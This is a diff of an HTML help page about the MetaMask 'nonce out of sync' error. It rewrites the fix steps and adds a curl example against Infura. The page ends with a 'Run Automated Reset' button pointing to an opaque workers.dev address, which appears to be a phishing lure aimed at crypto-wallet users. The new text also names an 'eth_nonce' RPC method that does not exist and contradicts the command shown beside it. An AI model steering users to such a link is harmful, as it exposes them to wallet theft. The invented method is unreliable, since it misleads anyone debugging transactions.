@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff7b2c; }
     .btn {
-        background: #00adb5;
+        background: #cf6679;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,35 +42,31 @@
 <h1>Metamask Nonce Out Of Sync</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter an error message stating "MetaMask nonce out of sync" when attempting to send transactions on the Ethereum network, indicating a discrepancy between the expected and actual nonce values.</li>
+<li>Users encounter an error message indicating that their MetaMask nonce is out of sync, preventing them from completing transactions on the Ethereum network.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs due to a mismatch between the nonce value stored in MetaMask and the actual nonce value on the Ethereum blockchain, often resulting from concurrent transactions or network congestion.</li>
+<li>The error occurs when the nonce (a counter that increments with each transaction) stored in MetaMask does not match the nonce expected by the Ethereum network, often due to cancelled or pending transactions.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, try the following steps:</li>
-<li>Reset the MetaMask account to resync the nonce value</li>
-<li>Manually adjust the nonce value in the transaction settings</li>
-<li>Use the <code>eth_getTransactionCount</code> method to retrieve the current nonce value</li>
+<li>Reset the account in MetaMask to resync the nonce:</li>
+<li>Increase the nonce manually in the transaction settings</li>
+<li>Use the <code>eth_nonce</code> RPC method to query the current nonce
+  <code>bash
+  curl -X POST \
+  https://mainnet.infura.io/v3/YOUR_PROJECT_ID \
+  -H 'Content-Type: application/json' \
+  -d '{"jsonrpc":"2.0","method":"eth_getTransactionCount","params":["0xYOUR_ADDRESS","latest"],"id":1}'</code></li>
+<li>Consider using an external tool for more complex nonce management, such as directly interacting with the Ethereum network via a console. </li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_getTransactionCount&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;0x742d35Cc6634C0532925a3b844Bc454e4438f44e&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;latest&quot;</span><span class="p">],</span>
-<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
-<span class="p">}</span>
-</code></pre></div>
-
-<p>Consider utilizing an external console for more advanced debugging and troubleshooting.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>MetaMask extension installed and configured</li>
-<li>Ethereum wallet with a sufficient balance</li>
-<li>Stable internet connection for blockchain synchronization</li>
+<li>MetaMask installed and configured</li>
+<li>Ethereum account with pending or cancelled transactions</li>
+<li>Infura project ID for RPC access</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-multiple-wallets-syncdiscovery-for-socia.html">Metamask Extension Bug Multiple Wallets Syncdiscovery For Social</a></li><li><a href="./archive/2026/06/metamask-extension-bug-networks-no-feedback-after-selecting-a-n.html">Metamask Extension Bug Networks No Feedback After Selecting A Network</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
